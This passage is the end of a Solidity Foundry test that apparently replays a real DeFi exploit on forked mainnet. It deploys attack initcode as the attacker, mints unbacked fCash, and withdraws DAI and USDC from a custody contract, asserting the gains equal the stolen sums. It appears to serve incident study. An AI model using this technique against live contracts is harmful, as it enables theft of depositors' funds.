    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        vm.label(ATTACKER, "AttackerEOA");
        vm.label(NOTIONAL, "Notional1155");
        vm.label(ESCROW, "Escrow");
        vm.label(CUSTODY, "TokenCustody");
        multiAssetLog = true;
        fundingTokens.push(address(DAI));
        fundingTokens.push(address(USDC));
        attacker = ATTACKER; // balanceLog tracks the attacker EOA
    }

    function testExploit() public balanceLog {
        uint256 attDaiBefore = DAI.balanceOf(ATTACKER);
        uint256 attUsdcBefore = USDC.balanceOf(ATTACKER);
        uint256 custDaiBefore = DAI.balanceOf(CUSTODY);
        uint256 custUsdcBefore = USDC.balanceOf(CUSTODY);

        // Act as the attacker EOA for both txs: msg.sender + tx.origin = ATTACKER, so the
        // deployed contract records the EOA as owner and later sweeps the funds back to it.
        vm.startPrank(ATTACKER, ATTACKER);

        // --- TX1: raw creation. Constructor mints the unbacked/overflowed fCash pair. ---
        vm.warp(TX1_TS);
        bytes memory code = ATTACK_INITCODE;
        address exploiter;
        assembly {
            exploiter := create(0, add(code, 0x20), mload(code))
        }
        require(exploiter != address(0), "TX1 creation reverted");

        // --- TX2: after maturity, settle the fake claim and withdraw real DAI + USDC. ---
        vm.warp(TX2_TS);
        (bool ok,) = exploiter.call(WITHDRAW_CALLDATA);
        require(ok, "TX2 settle/withdraw reverted");

        vm.stopPrank();

        uint256 attDaiGain = DAI.balanceOf(ATTACKER) - attDaiBefore;
        uint256 attUsdcGain = USDC.balanceOf(ATTACKER) - attUsdcBefore;
        uint256 custDaiLoss = custDaiBefore - DAI.balanceOf(CUSTODY);
        uint256 custUsdcLoss = custUsdcBefore - USDC.balanceOf(CUSTODY);

        emit log_named_decimal_uint("attacker DAI gain", attDaiGain, 18);
        emit log_named_decimal_uint("attacker USDC gain", attUsdcGain, 6);

        // Realized gain matches the incident to the wei, and equals the custody's loss.
        assertEq(attDaiGain, DAI_STOLEN, "DAI gain mismatch");
        assertEq(attUsdcGain, USDC_STOLEN, "USDC gain mismatch");
        assertEq(custDaiLoss, DAI_STOLEN, "custody DAI loss mismatch");
        assertEq(custUsdcLoss, USDC_STOLEN, "custody USDC loss mismatch");
    }
}
